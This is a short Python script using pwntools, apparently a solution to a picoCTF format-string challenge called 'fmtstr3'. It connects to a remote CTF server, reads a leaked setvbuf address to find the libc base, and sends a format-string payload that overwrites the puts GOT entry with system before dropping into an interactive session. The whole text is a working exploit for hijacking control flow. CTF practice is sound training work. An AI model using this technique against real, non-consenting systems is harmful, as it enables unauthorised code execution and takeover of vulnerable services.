from pwn import *
e=ELF('./fmtstr3')
libc=ELF('./libc.so.6')
context.binary=e
r=remote('rhea.picoctf.net', 60262)
r.recvuntil(b': ')
setvbuf=int(r.recvline(),16)
libc.address=setvbuf-libc.sym['setvbuf']
r.sendline(fmtstr_payload(38,{e.got['puts']: libc.sym['system']}))
r.interactive()

